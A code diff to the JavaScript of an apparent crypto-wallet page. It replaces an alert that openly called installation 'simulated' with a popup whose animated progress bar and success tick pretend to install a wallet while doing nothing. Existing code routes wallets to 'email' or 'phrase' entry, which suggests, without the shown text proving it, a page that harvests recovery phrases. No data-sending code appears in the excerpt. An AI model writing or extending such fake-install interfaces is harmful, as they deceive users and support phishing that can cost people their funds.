@@ -123,7 +123,72 @@ wallets.forEach((name) => {
   `;
 });
 
-// ✅ OPEN WALLET — email vs phrase routing
+// ==========================
+// ⭐ NEW INSTALL POPUP LOGIC
+// ==========================
+
+// Popup elements
+const popup = document.getElementById("installPopup");
+const popLogo = document.getElementById("popLogo");
+const popWalletName = document.getElementById("popWalletName");
+const progressText = document.getElementById("progressText");
+const progressFill = document.getElementById("progressFill");
+const successTick = document.getElementById("successTick");
+
+function startInstallPopup(walletName) {
+  // Set popup content
+  popWalletName.innerText = walletName;
+
+  let imageName =
+    walletName
+      .toLowerCase()
+      .replace(/\s+/g, "")
+      .replace(/'/g, "")
+      .replace(/\./g, "")
+      .replace(/-/g, "")
+      .replace(/\//g, "") + ".webp";
+
+  popLogo.src = `wallet-icons/${imageName}`;
+
+  // Reset UI before showing
+  progressFill.style.width = "0%";
+  successTick.style.opacity = 0;
+  popup.style.display = "flex";
+
+  let progress = 0;
+  const timer = setInterval(() => {
+    progress += 2;
+    progressFill.style.width = progress + "%";
+
+    if (progress >= 100) {
+      clearInterval(timer);
+
+      // Show success tick animation
+      setTimeout(() => {
+        successTick.style.opacity = 1;
+        successTick.style.transform = "scale(1.4)";
+      }, 300);
+
+      // Close popup after animation
+      setTimeout(() => {
+        popup.style.display = "none";
+      }, 1500);
+    }
+  }, 80);
+}
+
+// ==========================
+// REPLACE installWallet()
+// ==========================
+
+function installWallet(walletName) {
+  startInstallPopup(walletName);
+}
+
+// ==========================
+// Open Wallet (email/phrase routing)
+// ==========================
+
 function openWallet(walletName) {
   const emailWallets = ["Coinbase1", "Coinbase2", "Binance", "Bitget"];
 
@@ -138,7 +203,10 @@ function openWallet(walletName) {
   }
 }
 
-// ✅ SHARE WALLET
+// ==========================
+// Share wallet
+// ==========================
+
 function shareWallet(walletName) {
   const shareUrl =
     `${window.location.origin}/wallet-page.html?wallet=` +
@@ -155,17 +223,4 @@ function shareWallet(walletName) {
   } else {
     alert("Sharing not supported.");
   }
-}
-
-// ✅ INSTALL WALLET (safe)
-window.addEventListener("beforeinstallprompt", (e) => {
-  e.preventDefault();
-});
-
-function installWallet(walletName) {
-  if (!/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-    alert("Install only works on mobile.");
-    return;
-  }
-  alert("Installing... (simulated)");
 }
